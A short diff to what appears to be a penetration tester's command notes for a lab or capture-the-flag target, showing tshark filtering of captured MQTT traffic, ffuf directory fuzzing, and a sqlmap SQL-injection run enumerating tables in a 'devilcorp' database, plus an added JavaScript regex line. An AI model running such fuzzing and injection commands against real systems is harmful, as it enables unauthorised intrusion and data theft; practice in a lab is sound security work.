@@ -24,3 +24,5 @@ tshark -r /home/attacker/Documents/IoT\ Traffic\ Capture.pcapng -Y "mqtt.msgtype
 ffuf -u http://192.168.44.40/FUZZ.php?id=1 -w /usr/share/wordlists/dirb/common.txt -e .php
 
 sqlmap -r /home/attacker/Documents/burp_request.txt -p id -D devilcorp --tables --batch
+
+document.body.innerText.match(/\b\d\*[a-zA-Z]\*[a-zA-Z]\b/)
